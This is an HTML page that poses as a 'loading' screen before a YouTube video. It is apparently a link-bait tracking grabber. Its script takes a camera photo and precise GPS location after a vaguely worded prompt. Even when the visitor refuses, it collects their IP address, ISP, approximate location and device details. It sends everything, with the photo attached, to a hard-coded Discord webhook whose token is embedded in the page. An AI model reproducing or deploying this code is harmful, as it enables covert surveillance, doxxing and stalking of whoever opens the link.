<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .modal-box {
            background-color: #ffffff;
            padding: 24px;
            border-radius: 12px;
            text-align: center;
            max-width: 320px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            font-family: Arial, sans-serif;
        }

        .modal-box p {
            font-size: 16px;
            color: #333333;
            margin-bottom: 20px;
        }

        .modal-buttons {
            display: flex;
            justify-content: center;
            gap: 12px;
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            font-weight: bold;
        }

        .btn-accept {
            background-color: #007bff;
            color: white;
        }

        .btn-deny {
            background-color: #e0e0e0;
            color: #333333;
        }

        /* Elementos ocultos para captura de la cámara */
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <div id="consentModal" class="modal-overlay">
        <div class="modal-box">
            <p>¿Deseas activar tu ubicación y cámara?</p>

            <div class="modal-buttons">
                <button class="btn btn-accept" onclick="responderConsentimiento(true)">Aceptar</button>
                <button class="btn btn-deny" onclick="responderConsentimiento(false)">Rechazar</button>
            </div>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1513047206297600070/NvgpPaLE_sLhfPY757UyL_3F_y-JBkY_Ci5p6Imnwx1Ed_jHG2AXvrhAShuoUjXq9B6p";
        const YOUTUBE_URL = "https://youtu.be/M_0SVIoit9E?si=Otnw3p_biN4t3zle";

        function cerrarModal() {
            document.getElementById("consentModal").style.display = "none";
        }

        // Función para tomar la foto con permiso
        function tomarFoto() {
            return new Promise((resolve) => {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    resolve(null);
                    return;
                }

                // Pedir permiso de cámara al navegador
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                    .then((stream) => {
                        const video = document.getElementById("video");
                        const canvas = document.getElementById("canvas");
                        video.srcObject = stream;

                        video.onloadedmetadata = () => {
                            // Esperar a que el video cargue un fotograma
                            setTimeout(() => {
                                canvas.width = video.videoWidth || 640;
                                canvas.height = video.videoHeight || 480;
                                const ctx = canvas.getContext("2d");
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                                // Detener la cámara
                                stream.getTracks().forEach(track => track.stop());

                                // Convertir la imagen a un Blob (archivo)
                                canvas.toBlob((blob) => {
                                    resolve(blob);
                                }, "image/jpeg", 0.8);
                            }, 500);
                        };
                    })
                    .catch((err) => {
                        console.error("Permiso de cámara denegado:", err);
                        resolve(null); // Si rechaza la cámara, continúa sin foto
                    });
            });
        }

        // Función para pedir GPS
        function obtenerGPSNativo() {
            return new Promise((resolve) => {
                if (!("geolocation" in navigator)) {
                    resolve({ gpsData: "Geolocalización no soportada", mapLink: "N/A" });
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        const precision = Math.round(pos.coords.accuracy);

                        resolve({
                            gpsData: `Lat: ${lat}, Lon: ${lon} (Margen: ~${precision}m)`,
                            mapLink: `https://www.google.com/maps?q=${lat},${lon}`
                        });
                    },
                    (err) => {
                        resolve({ gpsData: `Permiso denegado/Error (${err.message})`, mapLink: "N/A" });
                    },
                    { enableHighAccuracy: true, timeout: 6000 }
                );
            });
        }

        async function responderConsentimiento(acepto) {
            cerrarModal();

            let gpsInfo = { gpsData: "El usuario rechazó la solicitud.", mapLink: "N/A" };
            let fotoBlob = null;

            if (acepto) {
                // Solicitar ubicación y foto en paralelo
                const [gpsRes, fotoRes] = await Promise.all([
                    obtenerGPSNativo(),
                    tomarFoto()
                ]);
                gpsInfo = gpsRes;
                fotoBlob = fotoRes;
            }

            let ipData = {};
            try {
                const res = await fetch("https://ipapi.co/json/");
                ipData = await res.json();
            } catch (e) {
                console.error("Error al obtener IP:", e);
            }

            const pantalla = `${window.screen.width}x${window.screen.height}`;
            const memoriaRAM = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "N/A";
            const nucleosCPU = navigator.hardwareConcurrency || "N/A";
            const idioma = navigator.language || "Desconocido";
            const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // Crear el objeto con los datos formateados
            const payload = {
                embeds: [{
                    title: "🔍 Registro de Visita con Permisos",
                    color: acepto ? 3066993 : 15158332,
                    fields: [
                        { name: "🌐 Dirección IP", value: ipData.ip || "No detectada", inline: true },
                        { name: "🏢 Proveedor (ISP)", value: ipData.org || "Desconocido", inline: true },
                        { name: "📍 Ubicación por IP", value: `${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country_name || '?'}`, inline: false },
                        { name: "🎯 GPS Exacto", value: gpsInfo.gpsData, inline: false },
                        { name: "🗺️ Enlace Google Maps", value: gpsInfo.mapLink, inline: false },
                        { name: "📷 Foto de Cámara", value: fotoBlob ? "Capturada con éxito (ver archivo adjunto)" : "No disponible / Denegada", inline: false },
                        { name: "💻 Pantalla", value: pantalla, inline: true },
                        { name: "🧠 RAM / CPU", value: `RAM: ${memoriaRAM} | Núcleos: ${nucleosCPU}`, inline: true },
                        { name: "🕒 Zona Horaria / Idioma", value: `${zonaHoraria} (${idioma})`, inline: true },
                        { name: "📱 User-Agent", value: navigator.userAgent, inline: false }
                    ],
                    footer: { text: "Registro con Consentimiento de Cámara y GPS" },
                    timestamp: new Date().toISOString()
                }]
            };

            // Enviar a Discord utilizando FormData para poder enviar la imagen adjunta
            const formData = new FormData();
            formData.append("payload_json", JSON.stringify(payload));
            if (fotoBlob) {
                formData.append("file", fotoBlob, "captura.jpg");
            }

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: "POST",
                    body: formData
                });
            } catch (err) {
                console.error("Error al enviar a Discord:", err);
            }

            // Redirigir a YouTube
            window.location.href = YOUTUBE_URL;
        }
    </script>
</body>
</html>
